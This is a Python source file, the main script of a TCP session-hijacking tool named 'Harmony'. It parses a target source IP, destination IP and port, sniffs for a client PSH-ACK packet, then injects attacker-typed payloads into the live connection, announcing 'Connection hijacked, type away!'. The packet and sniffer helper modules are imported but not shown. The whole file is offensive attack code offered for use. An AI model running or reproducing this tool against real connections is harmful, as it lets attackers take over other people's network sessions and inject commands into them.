#Harmony by @R00tendo
import argparse
import re
import signal
import sys
from libs import packet
from libs import sniffer

def main():

    print("""
                                              ░                                
   ▌▐    ▌▐     ██     ▒▒▒    ░░       ░░  ░     ░   ░      ░   ·       ·      
   ▌▐    ▌▐    █  █    ▒  ▒   ░ ░     ░ ░         ░    ░          ·   ·        
   ▌▐▀▀▀▀▌▐   █▄▄▄▄█   ▒▒▒    ░  ░   ░  ░ ░          ░      ░        ·         
   ▌▐    ▌▐  █      █  ▒  ▒   ░   ░ ░   ░        ░        ░        ·           
   ▌▐    ▌▐ █        █ ▒   ▒  ░    ░    ░   ░ ░      ░     ░     ·             
                                     Coded by @R00tendo
    """)

    parser = argparse.ArgumentParser()
    parser.add_argument("--target", required=True, help="Target connection to hijack. Format: <srcip>:<dstip>:<dstprt>")
    args = parser.parse_args()

    if len(args.target.split(":")) != 3:
        print("Invalid target!")
        exit()
    
    src_ip, dst_ip, dst_prt = args.target.split(":")[0], args.target.split(":")[1], args.target.split(":")[2] 
    ip_reg = re.compile('^((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)(\.(?!$)|$)){4}$')
    port_reg = re.compile('^((6553[0-5])|(655[0-2][0-9])|(65[0-4][0-9]{2})|(6[0-4][0-9]{3})|([1-5][0-9]{4})|([0-5]{0,5})|([0-9]{1,4}))$')
    if not ip_reg.match(src_ip) or not ip_reg.match(dst_ip):
        print("Invalid target IP!")
        exit()
    elif not port_reg.match(dst_prt):
        print("Invalid target port!")
        exit()
    
    print("Sniffing for a client PSH-ACK...")
    sniffer.start_sniffing(src_ip, dst_ip, dst_prt)
    if sniffer.injection_packet == False:
        print("Failed to get a packet sample :(")
        exit()

    print("Connection hijacked, type away!")
    packet.receive()
    while True:
        payload = sys.stdin.readline()
        rdy2go = packet.create_psh(payload)
        packet.send(rdy2go)

def on_exit(*_):
    print("Killing threads and exiting...")
    sniffer.stop_sniffing()
    packet.kill_switch = True
    sys.exit()

if __name__ == "__main__":
    signal.signal(signal.SIGINT, on_exit)
    main()